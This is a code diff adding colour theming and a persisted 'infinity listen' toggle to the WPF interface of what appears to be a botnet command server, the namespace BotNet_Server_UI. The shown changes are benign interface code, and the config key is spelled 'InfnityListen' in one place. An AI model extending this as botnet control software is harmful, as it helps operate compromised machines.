@@ -11,6 +11,7 @@ using System.Windows.Controls;
 using System.Windows.Input;
 using System.Windows.Media;
 using System.Windows.Threading;
+using System.Configuration;
 using CommandsLibrary;
 
 namespace BotNet_Server_UI
@@ -34,6 +35,24 @@ namespace BotNet_Server_UI
         public MainWindow()
         {
             InitializeComponent();
+            InfinityListenMenuItem.IsChecked = Convert.ToBoolean(m3md2.StaticVariables.Windows.InfinityListen);
+            SolidColorBrush brush = new SolidColorBrush(m3md2.ColorThemes.GetColors(ConfigurationManager.AppSettings.Get("ColorTheme"))[0]);
+            SolidColorBrush brush1 = new SolidColorBrush(m3md2.ColorThemes.GetColors(ConfigurationManager.AppSettings.Get("ColorTheme"))[1]);
+            SolidColorBrush brush2 = new SolidColorBrush(m3md2.ColorThemes.GetColors(ConfigurationManager.AppSettings.Get("ColorTheme"))[2]);
+            Grid.Background = brush;
+            ScrollLog.Background = brush1;
+            foreach (var label in m3md2.WinHelper.FindVisualChildren<Label>(Grid as DependencyObject))
+            {
+                label.Foreground = brush2;
+            }
+            foreach (var textBlock in m3md2.WinHelper.FindVisualChildren<TextBlock>(Grid as DependencyObject))
+            {
+                textBlock.Foreground = brush2;
+            }
+            foreach (var scrollViewer in m3md2.WinHelper.FindVisualChildren<ScrollViewer>(Grid as DependencyObject))
+            {
+                scrollViewer.Foreground = brush2;
+            }
             DispatcherTimer dispatcherTimer = new DispatcherTimer();
             dispatcherTimer.Tick += DispatcherTimer_Tick;
             dispatcherTimer.Interval = new TimeSpan(0, 0, 1);
@@ -344,12 +363,34 @@ namespace BotNet_Server_UI
 
         private void MenuItem_Checked(object sender, RoutedEventArgs e) // infinity listener
         {
-            StartListenAsync();
+            StartListenAsync(); 
+            var appSettings = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
+            foreach (var u2 in appSettings.AppSettings.Settings)
+            {
+                if ((u2 as KeyValueConfigurationElement).Key == "InfnityListen")
+                {
+                    (u2 as KeyValueConfigurationElement).Value = "True";
+                }
+            }
+            appSettings.Save(ConfigurationSaveMode.Minimal);
+            ConfigurationManager.RefreshSection("appSettings");
+
         }
 
         private void MenuItem_Unchecked(object sender, RoutedEventArgs e) // infinity listener
         {
-            StopListen();
+            StopListen(); 
+            var appSettings = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
+            foreach (var u2 in appSettings.AppSettings.Settings)
+            {
+                if ((u2 as KeyValueConfigurationElement).Key == "InfnityListen")
+                {
+                    (u2 as KeyValueConfigurationElement).Value = "False";
+                }
+            }
+            appSettings.Save(ConfigurationSaveMode.Minimal);
+            ConfigurationManager.RefreshSection("appSettings");
+
         }
     }
 }
